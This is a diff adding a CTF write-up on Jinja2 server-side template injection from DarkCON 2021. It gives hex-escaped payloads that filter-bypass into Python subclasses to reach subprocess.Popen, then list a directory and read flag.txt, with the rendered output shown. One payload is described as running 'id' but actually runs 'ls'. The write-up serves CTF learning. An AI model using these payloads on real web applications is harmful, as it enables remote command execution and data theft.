@@ -21,3 +21,37 @@ translates to ```config.class.init.globals['os'].popen('od -b -An fla*').read()`
   - An: This option tells od to suppress the default output of file offsets. Normally, od prefixes each line of output with the byte offset of that line within the file. -An removes these offsets from the output.
   - fla*: This is a shell glob pattern. It matches any files in the current directory whose names start with "fla". For example, it could match files like "flag.txt", "flag1.txt", etc.<br>
 The ouput gives a string of numbers which when converted from octal to ascii gives the flag.
+
+- ## DarkCON CTF 2021(DMM):
+
+The following payload will return all subclasses.
+
+```{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()}}```
+
+The following payload will return the output of the id command.
+
+```{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(407)('ls',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('strip')()}}```
+
+```
+<div style = "text-align:center">
+<h1>Oops! b&#39;app.py\nflag.txt\nrequirements.txt&#39; is 404 Not Found.</h1>
+</div>
+```
+Listing the directory content with the following payload.
+
+```{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(407)('ls',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('strip')()}}```
+```
+<div style = "text-align:center">
+<h1>Oops! b&#39;app.py\nflag.txt\nrequirements.txt&#39; is 404 Not Found.</h1>
+</div>
+```
+And printing flag.txt file.
+
+```{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(407)('cat flag.txt',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('strip')()}}```
+```
+<div style = "text-align:center">
+<h1>Oops! b&#39;darkCON{w0ww_y0u_ar3_sUp3er_h4ckeR_ggwpp_!!}&#39; is 404 Not Found.</h1>
+</div>
+```
+
+- ##
